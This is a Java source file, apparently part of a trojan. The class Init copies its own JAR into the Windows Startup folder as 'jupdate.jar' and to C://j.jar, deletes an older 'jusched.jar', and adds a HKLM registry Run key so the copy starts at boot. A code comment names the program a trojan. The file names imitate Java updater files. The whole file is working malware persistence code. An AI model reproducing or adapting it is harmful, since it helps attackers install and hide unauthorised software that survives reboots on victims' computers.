package mn.num;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.channels.FileChannel;

public class Init extends Thread {

    public Init() {
    }

    private static void copyfile(String srFile, String dtFile) {
        try {
            File in = new File(srFile);
            File out = new File(dtFile);
            FileChannel inChannel = new
                    FileInputStream(in).getChannel();
            FileChannel outChannel = new
                    FileOutputStream(out).getChannel();
            try {
                inChannel.transferTo(0, inChannel.size(),
                        outChannel);
            } catch (IOException e) {
                throw e;
            } finally {
                if (inChannel != null) inChannel.close();
                if (outChannel != null) outChannel.close();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void run() {
        Runtime rt = Runtime.getRuntime();
        try {
            copyfile(Misc.getJARLoc(), (new StringBuilder(String.valueOf(Misc.findStartup()))).append("\\jupdate.jar").toString());
            copyfile(Misc.getJARLoc(), "C://j.jar");
            try {
                /*
                 * Not really needed, this was just for when i used a dropper to drop the trojan into
                 * the users startup folder also with java.
                 */
                File f = new File(Misc.findStartup() + "//jusched.jar");
                f.delete();
            } catch (Exception e) {
            }
        } catch (Exception e) {
        }
        try {
            rt.exec("cmd.exe /C start reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v C://j.jar /t REG_SZ /d C://j.jar");
        } catch (IOException e) {
            e.printStackTrace();
        } catch (Exception exception) {
        }
    }
}